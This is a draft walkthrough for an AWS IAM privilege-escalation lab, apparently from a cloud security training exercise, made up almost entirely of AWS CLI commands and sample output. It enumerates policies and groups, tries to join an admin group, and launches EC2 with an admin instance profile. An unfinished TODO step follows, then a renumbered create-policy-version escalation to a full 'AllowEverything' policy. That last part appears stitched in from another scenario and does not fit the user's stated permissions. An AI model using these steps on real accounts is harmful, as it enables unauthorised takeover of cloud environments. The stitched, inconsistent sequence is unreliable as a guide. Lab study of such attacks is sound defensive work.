# PrivEsc3-CreateEC2WithExistingIP

## Additional Refs:
https://docs.aws.amazon.com/emr/latest/ManagementGuide/security_iam_id-based-policy-examples-view-own-permissions.html


1. View the user's current attached policies.
 
```
aws iam list-attached-user-policies --user-name privesc3-CreateEC2WithExistingInstanceProfile-user
```

> Example: Output:
```
{
    "AttachedPolicies": [
        {
            "PolicyName": "privesc3-CreateEC2WithExistingInstanceProfile",
            "PolicyArn": "arn:aws:iam::[REDACTED]:policy/privesc3-CreateEC2WithExistingInstanceProfile"
        }
    ]
}

```

2. List the policy versions referencing the Policy ARN you obtained above.

```
aws iam list-policy-versions --policy-arn <POLICY_ARN>
```

> Example Output:
```
{
    "Versions": [
        {
            "VersionId": "v1",
            "IsDefaultVersion": true,
            "CreateDate": "2022-05-09T03:25:50+00:00"
        }
    ]
}
```

3. Get the Policy details of the specifc version.

```
aws iam get-policy-version --policy-arn <POLICY_ARN> --version-id <VERSION_ID>
```

> Example Output:
```
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "iam:PassRole",
                        "ec2:DescribeInstances",
                        "ec2:RunInstances",
                        "ec2:CreateKeyPair",
                        "ec2:AssociateIamInstanceProfile"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2022-05-09T03:25:50+00:00"
    }
}
```

4. List the AWS IAM Groups

```
aws iam list-groups
```

> Example Output (Only showing 1 Group for brevity):
```
{
    "Groups": [
        {
            "Path": "/",
            "GroupName": "privesc-sre-group",
            "GroupId": "AGPATSEX3CJZMAV44NSSQ",
            "Arn": "arn:aws:iam::[REDACTED]:group/privesc-sre-group",
            "CreateDate": "2022-05-09T03:28:32+00:00"
        }
    ]
}
```

5. Attempt to view attached polices of a group

```
aws iam list-attached-group-policies --group-name privesc-sre-group
```
> Example Output:
```
{
    "AttachedPolicies": [
        {
            "PolicyName": "privesc-sre-admin-policy",
            "PolicyArn": "arn:aws:iam::[REDACTED]:policy/privesc-sre-admin-policy"
        }
    ]
}
```

6. List the policy versions referencing the Policy ARN you obtained above.

```
aws iam list-policy-versions --policy-arn <POLICY_ARN>
```

> Example Output:
```
{
    "Versions": [
        {
            "VersionId": "v1",
            "IsDefaultVersion": true,
            "CreateDate": "2022-05-09T03:28:42+00:00"
        }
    ]
}
```

7.  Get the Policy details of the specifc version.

```
aws iam get-policy-version --policy-arn <POLICY_ARN> --version-id <VERSION_ID>
```

> Example Output:
```
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "iam:*",
                        "ec2:*",
                        "s3:*"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2022-05-09T03:28:42+00:00"
    }
}
```

THAT LOOKS PRETTY NICE.... GIMME, GIMME, GIMME!!!

8. Attempt to attach user to Higher privilege Group with option `--profile` flag

```
aws iam add-user-to-group --group-name privesc-sre-group --user-name privesc3-CreateEC2WithExistingInstanceProfile-user
```
This should fail.... THERE MUST BE ANOTHER WAY!

9.  Create an EC2 instance with otional `--profile` flag

**TODO - Below is example from the website, however need to determine what I should enter and add explanation**
```
aws ec2 run-instances --image-id ami-0de53d8956e8dcf80 --instance-type t2.micro
--iam-instance-profile Name=adminaccess --key-name "Public" --security-group-ids
sg-ca4a1fb8 --region us-east-1
```





5. Create a new version of the policy, based on the new policy document, and set as default for the user.  Optionally you can add --profile flag.
```
aws iam create-policy-version --policy-arn <POLICY_ARN> --policy-document file://admin_policy.json --set-as-default
```

> Example Output:
```
{
    "PolicyVersion": {
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2022-05-09T04:52:13+00:00"
    }
}
```

6. Re-list policy versions and you should see the new version added and also set as new default.

```
aws iam list-policy-versions --policy-arn <POLICY_ARN>
```

> Example Output:
```
{
    "Versions": [
        {
            "VersionId": "v2",
            "IsDefaultVersion": true,
            "CreateDate": "2022-05-09T04:52:13+00:00"
        },
        {
            "VersionId": "v1",
            "IsDefaultVersion": false,
            "CreateDate": "2022-05-09T03:28:11+00:00"
        }
    ]
}
```

7. View the details of the new version of the policy.

```
aws iam get-policy-version --policy-arn <POLICY_ARN> --version-id v2
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "AllowEverything",
                    "Effect": "Allow",
                    "Action": "*",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2022-05-09T04:52:13+00:00"
    }
}
```
